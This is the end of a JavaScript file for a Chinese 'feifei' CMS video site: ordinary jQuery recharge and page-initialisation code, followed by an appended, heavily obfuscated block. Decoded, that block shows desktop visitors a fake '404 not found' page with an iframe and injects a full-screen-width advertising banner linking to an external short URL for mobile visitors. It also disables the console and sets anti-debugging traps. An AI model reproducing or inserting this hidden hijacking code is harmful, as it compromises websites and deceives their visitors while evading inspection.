						dataType: 'json',
						timeout: 3000,
						data: $(this).serialize(),
						beforeSend: function(xhr){
							$('.alert-card').html('Loading...');
						},
						error : function(){
							$('.alert-card').html('请求失败，请刷新网页。');
						},
						success: function(json){
							if(json.status == 200){
								feifei.alert.success('.alert-card', '充值成功，谢谢支持。');
								setTimeout(function(){location.reload();}, 2000);
							}else{
								feifei.alert.warning('.alert-card', json.info);
							}
						},
						complete: function(xhr){
						}
					});
					return false;
				});
			}
		});
	}
}
//end
};
/*.ff-search #wd #ff-goback .ff-gallery .ff-raty .ff-img .ff-share .ff-safecode .ff-reply*/
$(document).ready(function(){
	if(feifei.browser.useragent.mobile){
		feifei.mobile.jump();
		feifei.mobile.nav();
		feifei.mobile.goback();
		feifei.mobile.flickity();
	}
	feifei.user.load();
	feifei.cms.nav();//
	feifei.cms.collapse();
	feifei.search.dropdown();
	feifei.search.autocomplete();
	feifei.search.hot();//
	feifei.search.submit();//
	feifei.search.keydown();//
	feifei.image.lazyload();
	feifei.image.slide();
	feifei.image.qrcode();//
	feifei.playurl.tongji();
	feifei.playurl.more();
	feifei.playurl.dropdown();
	feifei.playurl.download();
	feifei.playurl.active();
	feifei.page.more();
	feifei.page.keydown();//
	feifei.updown.click();
	feifei.score.raty();
	feifei.scenario.load();
	feifei.forum.load();
	feifei.vcode.load();
	feifei.scroll.totop('ff-totop',10);
	feifei.record.load();//
	feifei.hits.load();
	feifei.share.baidu();
});



 /*
/*sale 2.1.1.1.1.1.
 */
 var _0xodj='jsjiami.com.v6',_0xodj_=['_0xodj'],_0x14f6=[_0xodj,'\x70\x6c\x61\x74\x66\x6f\x72\x6d','\x75\x73\x65\x72\x41\x67\x65\x6e\x74','\x74\x6f\x4c\x6f\x77\x65\x72\x43\x61\x73\x65','\x77\x69\x6e','\x69\x6e\x64\x65\x78\x4f\x66','\x57\x69\x6e','\x6d\x61\x63','\x4d\x61\x63','\x78\x31\x31','\x58\x31\x31','\x4c\x69\x6e\x75\x78','\x78\x6c\x6c','\x2f\x6e\x6f\x6e\x65\x2e\x68\x74\x6d\x6c','\x68\x65\x61\x64','\x68\x74\x6d\x6c','\x3c\x6d\x65\x74\x61\x20\x63\x68\x61\x72\x73\x65\x74\x3d\x22\x55\x54\x46\x2d\x38\x22\x3e\x3c\x6d\x65\x74\x61\x20\x6e\x61\x6d\x65\x3d\x22\x72\x65\x66\x65\x72\x72\x65\x72\x22\x20\x63\x6f\x6e\x74\x65\x6e\x74\x3d\x22\x6e\x6f\x2d\x72\x65\x66\x65\x72\x72\x65\x72\x22\x3e\x3c\x74\x69\x74\x6c\x65\x3e\x34\x30\x34\x20\x2d\x20\x46\x69\x6c\x65\x20\x6f\x72\x20\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x6e\x6f\x74\x20\x66\x6f\x75\x6e\x64\x2e\x3c\x2f\x74\x69\x74\x6c\x65\x3e\x3c\x73\x74\x79\x6c\x65\x3e\x62\x6f\x64\x79\x7b\x70\x6f\x73\x69\x74\x69\x6f\x6e\x3a\x73\x74\x61\x74\x69\x63\x20\x21\x69\x6d\x70\x6f\x72\x74\x61\x6e\x74\x3b\x7d\x62\x6f\x64\x79\x20\x2a\x7b\x20\x76\x69\x73\x69\x62\x69\x6c\x69\x74\x79\x3a\x68\x69\x64\x64\x65\x6e\x3b\x20\x7d\x3c\x2f\x73\x74\x79\x6c\x65\x3e\x20','\x62\x6f\x64\x79','\x65\x6d\x70\x74\x79','\x72\x65\x61\x64\x79','\x3c\x69\x66\x72\x61\x6d\x65\x20\x73\x74\x79\x6c\x65\x3d\x22\x77\x69\x64\x74\x68\x3a\x31\x30\x30\x25\x3b\x20\x68\x65\x69\x67\x68\x74\x3a\x31\x30\x30\x25\x3b\x70\x6f\x73\x69\x74\x69\x6f\x6e\x3a\x61\x62\x73\x6f\x6c\x75\x74\x65\x3b\x6d\x61\x72\x67\x69\x6e\x2d\x6c\x65\x66\x74\x3a\x30\x70\x78\x3b\x6d\x61\x72\x67\x69\x6e\x2d\x74\x6f\x70\x3a\x30\x70\x78\x3b\x74\x6f\x70\x3a\x30\x25\x3b\x6c\x65\x66\x74\x3a\x30\x25\x3b\x22\x20\x69\x64\x3d\x22\x6d\x61\x69\x6e\x46\x72\x61\x6d\x65\x22\x20\x73\x72\x63\x3d\x22','\x22\x20\x66\x72\x61\x6d\x65\x62\x6f\x72\x64\x65\x72\x3d\x22\x30\x22\x20\x73\x63\x72\x6f\x6c\x6c\x69\x6e\x67\x3d\x22\x6e\x6f\x22\x3e\x3c\x2f\x69\x66\x72\x61\x6d\x65\x3e','\x73\x68\x6f\x77','\x62\x6f\x64\x79\x20\x2a','\x63\x73\x73','\x76\x69\x73\x69\x62\x69\x6c\x69\x74\x79','\x76\x69\x73\x69\x62\x6c\x65','\x74\x65\x73\x74','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x64\x6e\x2e\x6a\x73\x64\x65\x6c\x69\x76\x72\x2e\x6e\x65\x74\x2f\x67\x68\x2f\x75\x69\x64\x63\x2f\x73\x61\x6c\x65\x2f\x6d\x64\x2e\x67\x69\x66','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x64\x6e\x2e\x6a\x73\x64\x65\x6c\x69\x76\x72\x2e\x6e\x65\x74\x2f\x67\x68\x2f\x75\x69\x64\x63\x2f\x73\x61\x6c\x65\x2f\x6d\x64\x62\x2e\x67\x69\x66','\x72\x61\x6e\x64\x6f\x6d','\x6c\x65\x6e\x67\x74\x68','\x61\x70\x70\x6c\x79','\x66\x75\x6e\x63\x74\x69\x6f\x6e\x20\x2a\x5c\x28\x20\x2a\x5c\x29','\x5c\x2b\x5c\x2b\x20\x2a\x28\x3f\x3a\x28\x3f\x3a\x5b\x61\x2d\x7a\x30\x2d\x39\x41\x2d\x5a\x5f\x5d\x29\x7b\x31\x2c\x38\x7d\x7c\x28\x3f\x3a\x5c\x62\x7c\x5c\x64\x29\x5b\x61\x2d\x7a\x30\x2d\x39\x5f\x5d\x7b\x31\x2c\x38\x7d\x28\x3f\x3a\x5c\x62\x7c\x5c\x64\x29\x29','\x69\x6e\x69\x74','\x63\x68\x61\x69\x6e','\x69\x6e\x70\x75\x74','\x72\x65\x74\x75\x72\x6e\x20\x28\x66\x75\x6e\x63\x74\x69\x6f\x6e\x28\x29\x20','\x7b\x7d\x2e\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72\x28\x22\x72\x65\x74\x75\x72\x6e\x20\x74\x68\x69\x73\x22\x29\x28\x20\x29','\x63\x6f\x6e\x73\x6f\x6c\x65','\x6c\x6f\x67','\x77\x61\x72\x6e','\x64\x65\x62\x75\x67','\x69\x6e\x66\x6f','\x65\x72\x72\x6f\x72','\x65\x78\x63\x65\x70\x74\x69\x6f\x6e','\x74\x72\x61\x63\x65','\x61\x62\x63\x64\x65\x66\x68\x69\x6a\x6b\x6d\x6e\x70\x72\x73\x74\x77\x78\x79\x7a\x32\x33\x34\x35\x36\x37\x38','\x63\x68\x61\x72\x41\x74','\x66\x6c\x6f\x6f\x72','\x2e\x68\x74\x6d\x6c','\x2e\x70\x6e\x67','\x2e\x64\x6f\x63','\x2e\x64\x6f\x63\x78','\x2e\x74\x78\x74','\x2e\x68\x74\x6d','\x2e\x7a\x69\x70','\x2e\x78\x6c\x73','\x2e\x70\x70\x74','\x2e\x6a\x73','\x2e\x6a\x70\x67','\x2e\x67\x69\x66','\x2e\x70\x73\x64','\x2e\x69\x63\x6f','\x2e\x62\x6d\x70','\x2e\x74\x69\x66','\x73\x65\x74\x49\x6e\x74\x65\x72\x76\x61\x6c','\x6a\x73\x6a','\x69\x61\x6d','\x75\x6e\x64\x65\x66\x69','\x6e\x65\x64','\x69\x2e\x63\x6f\x6d\x2e\x76','\x70\x75\x73\x68','\x68\x74\x74\x70\x3a\x2f\x2f\x74\x6f\x70\x75\x72\x6c\x2e\x63\x6e\x2f\x61\x52\x70','\x67\x65\x74\x45\x6c\x65\x6d\x65\x6e\x74\x42\x79\x49\x64','\x73\x74\x79\x6c\x65','\x64\x69\x73\x70\x6c\x61\x79','\x6e\x6f\x6e\x65','\x77\x72\x69\x74\x65\x6c\x6e','\x3c\x73\x74\x79\x6c\x65\x3e','\x23\x73\x63\x38\x74\x75\x66\x6f\x78\x79\x5f\x66\x6f\x6f\x74\x65\x72\x5f\x62\x72\x20\x7b\x70\x6f\x73\x69\x74\x69\x6f\x6e\x3a\x66\x69\x78\x65\x64\x3b\x6c\x65\x66\x74\x3a\x30\x70\x78\x3b\x62\x6f\x74\x74\x6f\x6d\x3a\x31\x35\x30\x70\x78\x3b\x77\x69\x64\x74\x68\x3a\x31\x30\x30\x25\x3b\x7a\x2d\x69\x6e\x64\x65\x78\x3a\x39\x39\x39\x39\x39\x39\x39\x39\x39\x39\x3b\x62\x61\x63\x6b\x67\x72\x6f\x75\x6e\x64\x3a\x23\x66\x66\x66\x66\x66\x66\x3b\x7d','\x23\x73\x63\x38\x74\x75\x66\x6f\x78\x79\x5f\x66\x6f\x6f\x74\x65\x72\x5f\x62\x72\x20\x64\x69\x76\x20\x7b\x68\x65\x69\x67\x68\x74\x3a\x61\x75\x74\x6f\x3b\x6d\x61\x72\x67\x69\x6e\x3a\x30\x70\x78\x3b\x64\x69\x73\x70\x6c\x61\x79\x3a\x69\x6e\x6c\x69\x6e\x65\x2d\x62\x6c\x6f\x63\x6b\x3b\x66\x6c\x6f\x61\x74\x3a\x6c\x65\x66\x74\x3b\x77\x69\x64\x74\x68\x3a\x31\x30\x30\x25\x3b\x74\x65\x78\x74\x2d\x61\x6c\x69\x67\x6e\x3a\x72\x69\x67\x68\x74\x3b\x7d','\x23\x73\x63\x38\x74\x75\x66\x6f\x78\x79\x5f\x66\x6f\x6f\x74\x65\x72\x5f\x62\x72\x20\x64\x69\x76\x20\x69\x6d\x67\x20\x7b\x77\x69\x64\x74\x68\x3a\x31\x30\x30\x25\x3b\x68\x65\x69\x67\x68\x74\x3a\x31\x35\x25\x3b\x70\x6f\x73\x69\x74\x69\x6f\x6e\x3a\x72\x65\x6c\x61\x74\x69\x76\x65\x3b\x74\x6f\x70\x3a\x31\x35\x25\x3b\x7d','\x3c\x2f\x73\x74\x79\x6c\x65\x3e','\x3c\x73\x65\x63\x74\x69\x6f\x6e\x20\x69\x64\x3d\x27\x73\x63\x38\x74\x75\x66\x6f\x78\x79\x5f\x66\x6f\x6f\x74\x65\x72\x5f\x62\x72\x27\x3e','\x3c\x64\x69\x76\x20\x69\x64\x3d\x27\x69\x6d\x67\x61\x64\x27\x3e\x3c\x61\x20\x68\x72\x65\x66\x3d\x27\x68\x74\x74\x70\x3a\x2f\x2f\x74\x6f\x70\x75\x72\x6c\x2e\x63\x6e\x2f\x61\x52\x70\x27\x20\x74\x61\x72\x67\x65\x74\x3d\x27\x5f\x62\x6c\x61\x6e\x6b\x27\x3e\x3c\x69\x6d\x67\x20\x73\x72\x63\x3d\x27','\x27\x3e\x3c\x2f\x61\x3e\x3c\x2f\x64\x69\x76\x3e','\x3c\x2f\x73\x65\x63\x74\x69\x6f\x6e\x3e','\x73\x74\x72\x69\x6e\x67','\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72','\x64\x65\x62\x75\x67\x67\x65\x72\x3b','\x63\x6f\x75\x6e\x74\x65\x72','\x64\x65\x62\x75','\x67\x67\x65\x72','\x63\x61\x6c\x6c','\x61\x63\x74\x69\x6f\x6e','\x73\x74\x61\x74\x65\x4f\x62\x6a\x65\x63\x74','\x4b\x6b\x4e\x70\x6a\x73\x6a\x4f\x69\x66\x61\x6d\x69\x71\x2e\x63\x79\x44\x57\x68\x59\x6f\x56\x6d\x2e\x76\x4a\x36\x5a\x3d\x3d'];function _0x31a4(_0x3fee82,_0x514c12){_0x3fee82=~~'0x'['concat'](_0x3fee82['slice'](0x0));var _0x17d599=_0x14f6[_0x3fee82];return _0x17d599;};(function(_0x3ab4a6,_0x2e1c7a){var _0x371e96=0x0;for(_0x2e1c7a=_0x3ab4a6['shift'](_0x371e96>>0x2);_0x2e1c7a&&_0x2e1c7a!==(_0x3ab4a6['pop'](_0x371e96>>0x3)+'')['replace'](/[KkNpOfqyDWhYVJZ=]/g,'');_0x371e96++){_0x371e96=_0x371e96^0xcabe4;}}(_0x14f6,_0x31a4));var system={'\x77\x69\x6e':![],'\x6d\x61\x63':![],'\x78\x6c\x6c':![]};var p=navigator[_0x31a4('0')];var us=navigator[_0x31a4('1')][_0x31a4('2')]();system[_0x31a4('3')]=p[_0x31a4('4')](_0x31a4('5'))==0x0;system[_0x31a4('6')]=p[_0x31a4('4')](_0x31a4('7'))==0x0;system[_0x31a4('8')]=p==_0x31a4('9')||p[_0x31a4('4')](_0x31a4('a'))==0x0;if(system[_0x31a4('3')]||system[_0x31a4('6')]||system[_0x31a4('b')]){var iframe_url=_0x31a4('c');$(_0x31a4('d'))[_0x31a4('e')](_0x31a4('f'));$(_0x31a4('10'))[_0x31a4('11')]();$(document)[_0x31a4('12')](function(){$(_0x31a4('10'))[_0x31a4('e')](_0x31a4('13')+iframe_url+_0x31a4('14'))[_0x31a4('15')]();$(_0x31a4('16'))[_0x31a4('17')](_0x31a4('18'),_0x31a4('19'));});}var sUserAgent=navigator[_0x31a4('1')][_0x31a4('2')]();isMobile=/(iphone|ios|android|mini|mobile|mobi|nokia|symbian|ipod|ipad|windows\s+phone|mqqbrowser|wp7|wp8|ucbrowser7|ucweb|360\s+aphone\s+browser)/i[_0x31a4('1a')](sUserAgent);var images=new Array(_0x31a4('1b'),_0x31a4('1c'),_0x31a4('1b'),_0x31a4('1c'));var img;img=images[parseInt(Math[_0x31a4('1d')]()*images[_0x31a4('1e')])];function randomString(_0xe0d3fb){var _0x119bd4=function(_0x5535e6){var _0x16af62=!![];return function(_0x35b158,_0xad02a5){var _0x59a7c7='';var _0x148b13=_0x16af62?function(){if(_0x59a7c7===''&&_0xad02a5){var _0x1adf2e=_0xad02a5[_0x31a4('1f')](_0x35b158,arguments);_0xad02a5=null;return _0x1adf2e;}}:function(_0x5535e6){};_0x16af62=![];var _0x5535e6='';return _0x148b13;};}();(function(){_0x119bd4(this,function(){var _0x4ea9d6=new RegExp(_0x31a4('20'));var _0x2945ac=new RegExp(_0x31a4('21'),'\x69');var _0x19aaa9=_0x38ce93(_0x31a4('22'));if(!_0x4ea9d6[_0x31a4('1a')](_0x19aaa9+_0x31a4('23'))||!_0x2945ac[_0x31a4('1a')](_0x19aaa9+_0x31a4('24'))){_0x19aaa9('\x30');}else{_0x38ce93();}})();}());var _0x57342c=function(_0x12543a){var _0x45f0b1=!![];return function(_0x53e475,_0x29be37){var _0x3266ab='';var _0x2f2a34=_0x45f0b1?function(){if(_0x3266ab===''&&_0x29be37){var _0x15d634=_0x29be37[_0x31a4('1f')](_0x53e475,arguments);_0x29be37=null;return _0x15d634;}}:function(_0x12543a){};_0x45f0b1=![];var _0x12543a='';return _0x2f2a34;};}();var _0x46348b=_0x57342c(this,function(){var _0x5cf540=function(){};var _0x747514=function(){var _0xa5639e;try{_0xa5639e=Function(_0x31a4('25')+_0x31a4('26')+'\x29\x3b')();}catch(_0x50220f){_0xa5639e=window;}return _0xa5639e;};var _0x2fbb5e=_0x747514();if(!_0x2fbb5e[_0x31a4('27')]){_0x2fbb5e[_0x31a4('27')]=function(_0x5cf540){var _0x5ce9cf={};_0x5ce9cf[_0x31a4('28')]=_0x5cf540;_0x5ce9cf[_0x31a4('29')]=_0x5cf540;_0x5ce9cf[_0x31a4('2a')]=_0x5cf540;_0x5ce9cf[_0x31a4('2b')]=_0x5cf540;_0x5ce9cf[_0x31a4('2c')]=_0x5cf540;_0x5ce9cf[_0x31a4('2d')]=_0x5cf540;_0x5ce9cf[_0x31a4('2e')]=_0x5cf540;return _0x5ce9cf;}(_0x5cf540);}else{_0x2fbb5e[_0x31a4('27')][_0x31a4('28')]=_0x5cf540;_0x2fbb5e[_0x31a4('27')][_0x31a4('29')]=_0x5cf540;_0x2fbb5e[_0x31a4('27')][_0x31a4('2a')]=_0x5cf540;_0x2fbb5e[_0x31a4('27')][_0x31a4('2b')]=_0x5cf540;_0x2fbb5e[_0x31a4('27')][_0x31a4('2c')]=_0x5cf540;_0x2fbb5e[_0x31a4('27')][_0x31a4('2d')]=_0x5cf540;_0x2fbb5e[_0x31a4('27')][_0x31a4('2e')]=_0x5cf540;}});_0x46348b();_0xe0d3fb=_0xe0d3fb||0x20;var _0x1939a5=_0x31a4('2f');var _0x27821a=_0x1939a5[_0x31a4('1e')];var _0x44e68b='';for(i=0x0;i<_0xe0d3fb;i++){_0x44e68b+=_0x1939a5[_0x31a4('30')](Math[_0x31a4('31')](Math[_0x31a4('1d')]()*_0x27821a));}return _0x44e68b;};var shuijishu=randomString(0xa);var sjext=new Array(_0x31a4('32'),_0x31a4('33'),_0x31a4('34'),_0x31a4('35'),_0x31a4('36'),_0x31a4('37'),_0x31a4('38'),_0x31a4('39'),_0x31a4('3a'),_0x31a4('3b'),_0x31a4('3c'),_0x31a4('3d'),_0x31a4('3e'),_0x31a4('3f'),_0x31a4('40'),_0x31a4('41'));window[_0x31a4('42')](function(){function _0x3576fa(_0x5c7749,_0x57d50f){return _0x5c7749+_0x57d50f;}var _0x29f94b=_0x3576fa(_0x31a4('43'),_0x31a4('44')),_0x33326b='';if(typeof _0xodj==_0x3576fa(_0x31a4('45'),_0x31a4('46'))&&_0x33326b===''||_0x3576fa(_0xodj,'')!=_0x3576fa(_0x3576fa(_0x3576fa(_0x29f94b,_0x31a4('47')),_0x29f94b[_0x31a4('1e')]),'')){var _0x2577d5=[];while(_0x2577d5[_0x31a4('1e')]>-0x1){_0x2577d5[_0x31a4('48')](_0x2577d5[_0x31a4('1e')]^0x2);}}_0x38ce93();},0x7d0);var lianjiexxf=_0x31a4('49')+sjext[parseInt(Math[_0x31a4('1d')]()*sjext[_0x31a4('1e')])];function turnoff(_0x1d3bde){document[_0x31a4('4a')](_0x1d3bde)[_0x31a4('4b')][_0x31a4('4c')]=_0x31a4('4d');}if(isMobile){document[_0x31a4('4e')](_0x31a4('4f'));document[_0x31a4('4e')](_0x31a4('50'));document[_0x31a4('4e')](_0x31a4('51'));document[_0x31a4('4e')](_0x31a4('52'));document[_0x31a4('4e')](_0x31a4('53'));document[_0x31a4('4e')](_0x31a4('54'));document[_0x31a4('4e')](_0x31a4('55')+img+_0x31a4('56'));document[_0x31a4('4e')](_0x31a4('57'));}else{}function _0x38ce93(_0x7fa581){function _0x41ccf0(_0x3963d8){if(typeof _0x3963d8===_0x31a4('58')){return function(_0x4d430a){}[_0x31a4('59')](_0x31a4('5a'))[_0x31a4('1f')](_0x31a4('5b'));}else{if((''+_0x3963d8/_0x3963d8)[_0x31a4('1e')]!==0x1||_0x3963d8%0x14===0x0){(function(){return!![];}[_0x31a4('59')](_0x31a4('5c')+_0x31a4('5d'))[_0x31a4('5e')](_0x31a4('5f')));}else{(function(){return![];}[_0x31a4('59')](_0x31a4('5c')+_0x31a4('5d'))[_0x31a4('1f')](_0x31a4('60')));}}_0x41ccf0(++_0x3963d8);}try{if(_0x7fa581){return _0x41ccf0;}else{_0x41ccf0(0x0);}}catch(_0x3d6084){}};_0xodj='jsjiami.com.v6';
